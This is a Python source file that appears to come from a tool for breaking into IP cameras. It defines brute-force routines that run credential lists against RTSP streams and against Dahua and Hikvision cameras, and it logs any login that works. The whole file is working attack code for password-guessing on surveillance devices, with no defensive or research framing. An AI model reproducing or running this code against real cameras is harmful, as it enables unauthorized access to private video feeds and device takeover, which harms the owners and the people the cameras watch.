from connectors.rtsp import RTSPClient, rtsp_connect
from connectors.dahua import DahuaController
from connectors.hikvision import HikClient

def rtsp_bruter(target, creds, logging):
    CREDENTIALS_OK_CODES = ["RTSP/1.0 200", "RTSP/1.0 404", "RTSP/2.0 200", "RTSP/2.0 404"]
    if target is None: return None

    if target.is_authorized:
        logging.info(f'[RTSP] Without auth for: {target}')
        return target
    
    ok = rtsp_connect(target, credentials=":")
    if ok and any(code in target.data for code in CREDENTIALS_OK_CODES):
        logging.info(f'[RTSP] Without auth for: {target}')
        return target
    
    for cred in creds:
        ok = rtsp_connect(target, credentials=cred.replace('\n', ''))
        if not ok:
            break
        if any(code in target.data for code in CREDENTIALS_OK_CODES):
            target.credentials = cred.replace('\n', '')
            logging.info(f'[RTSP] Creds found for: {target}')
            return target
    logging.debug(f'[RTSP] Creds not found for: {target}')
        

def dahua_bruter(target, creds, logging):
    if not target: return False
    server_ip, port = target.split(':')

    for cred in creds:
        login, password = cred.split(':')
        login, password = login.replace('\n', ''), password.replace('\n', '')
        try:
            dahua = DahuaController(server_ip, int(port), login.replace('\n', ''), password.replace('\n', ''))
            try:
                if dahua.status == 0:
                    logging.info(f'[DAHUA] [{port}] Success login: {server_ip} with {login}:{password}')
                    return server_ip, port, login, password, dahua
                elif dahua.status == 2:
                    logging.debug(f'[DAHUA] [{port}] Blocked camera: %s:%s' % (server_ip, port))
                    return False
                else:
                    logging.debug(f'[DAHUA] [{port}] Unable to login: %s:%s with %s:%s' % (server_ip, port, login, password))
                    return False
            except:
                logging.debug(f'[DAHUA] [{port}] Failed login: {server_ip} with {login}:{password}')
                return False
        except Exception as e:
            logging.error(e)

def hikka_bruter(target, creds, logging):
    if not target: return False
    server_ip, port = target.split(':')

    for cred in creds:
        login, password = cred.split(':')
        login, password = login.replace('\n', ''), password.replace('\n', '')
        try:
            hikka = HikClient(server_ip, int(port), login.replace('\n', ''), password.replace('\n', ''))
            connection = hikka.connect()
            if connection:
                logging.info(f'[HIKKA] [{port}] Success login: {server_ip} with {login}:{password}')
                return server_ip, port, login, password, hikka
            else:
                logging.debug(f'[HIKKA] [{port}] Unable to login: %s:%s with %s:%s' % (server_ip, port, login, password))
                return False
        except Exception as e:
            logging.debug(f'[HIKKA] [{port}] Unable to login: %s:%s with %s:%s' % (server_ip, port, login, password))
            return False